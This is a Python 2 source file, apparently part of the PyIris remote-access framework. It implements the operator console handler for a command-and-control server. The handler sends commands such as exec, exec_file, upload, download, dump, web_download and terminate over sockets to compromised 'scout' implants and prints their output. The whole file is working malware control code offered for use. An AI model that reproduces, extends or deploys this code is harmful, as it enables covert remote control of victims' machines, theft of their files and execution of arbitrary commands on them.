import socket,time,cfg,pickle
from termcolor import colored
from modules.banner import *
from modules.wipe import *
from modules.clean import *
from modules.recv_all import *
from modules.payload_menus import *

cfg.global_variables()

def Pyiris_handler(id):
	print cfg.pos+'Bridged to scout of ID : '+str(cfg.db_scouts[id][0])
	prompt_handler=colored('PyIris (','white',attrs=['bold'])+colored(cfg.db_scouts[id][3],'red',attrs=['bold'])+colored(') > ','white',attrs=['bold'])
	while True:
		try:
			input=raw_input(prompt_handler).strip()
			command=input.split(' ')[0]
			if command == 'banner':
				display_banner()
			elif command == 'help':
				print payload_help_menus(cfg.db_scouts[id][3])
			elif command == 'quit':
				cleanup()
			elif command == 'clear':
				clear()
			elif command == 'back':
				print '\n'+cfg.pos+'Returning...'
				return
			elif command == 'disconnect':
				cfg.db_scouts[id][5].sendall(input + End)
				output = recvall(cfg.db_scouts[id][5])
				print output
				cfg.db_scouts.pop(id)
				break
			elif command == 'terminate':
				cfg.db_scouts[id][5].sendall(input + End)
				output = recvall(cfg.db_scouts[id][5])
				print output
				cfg.db_scouts.pop(id)
				break
			elif command == 'sleep':
				cfg.db_scouts[id][5].sendall(input + End)
				output = recvall(cfg.db_scouts[id][5])
				print output
				if '[*]' in output:
					cfg.db_scouts.pop(id)
					break
			elif command == 'exec':
				cfg.db_scouts[id][5].sendall(input+End)
				output=recvall(cfg.db_scouts[id][5])
				print output
			elif command == 'exec_file':	
				cfg.db_scouts[id][5].sendall(input+End)
				output=recvall(cfg.db_scouts[id][5])
				print output
			elif command == 'toggle':
				cfg.db_scouts[id][5].sendall(input+End)
				output=recvall(cfg.db_scouts[id][5])
				print output
			elif command == 'download':
				cfg.db_scouts[id][5].sendall(input+End)
				output = recvall(cfg.db_scouts[id][5])
				if '|/' in output:
					output=output.split('|/',1)
					f = open(output[0], 'wb')
					f.write(output[1])
					f.close()
					print cfg.pos + 'Downloaded file succesfully'
				else:
					print output
			elif command == 'upload':
				try:
					file_name=input.split(' ',1)[1]
				except:
					print cfg.err+'Specify file to upload'
					continue
				if os.path.isfile(file_name):
					f=open(file_name,'rb')
					data=f.read()
					f.close()
					cfg.db_scouts[id][5].sendall('upload '+file_name+'|/'+data+End)
					output = recvall(cfg.db_scouts[id][5])
					print output
				else:
					print cfg.err+'File path/name is not valid'
			elif command == 'dump':
				cfg.db_scouts[id][5].sendall(input+End)
				output = recvall(cfg.db_scouts[id][5])
				print cfg.note+'Dumped contents :\n'
				print output
			elif command == 'web_download':
				cfg.db_scouts[id][5].sendall(input+End)
				output = recvall(cfg.db_scouts[id][5])
				print output
			elif command == '':
				pass
			else:
				print cfg.err+'Unknown command "'+command+'", run "help" for help menu'
		except EOFError:
			try:
				time.sleep(3)
			except KeyboardInterrupt:
				cleanup()
		except KeyboardInterrupt:
			cleanup()
		except socket.error as e:
			print cfg.err+'Socket error detected : '+str(e)
			print cfg.err+'Stopping current session...'
			cfg.db_scouts.pop(id)
			print cfg.note+'Returning...'
			return
		except Exception as e:
			try:
				command
				print cfg.err+'Error running command "'+command+'" : '+str(e)
			except:
				print cfg.err+'Error with handler : '+str(e)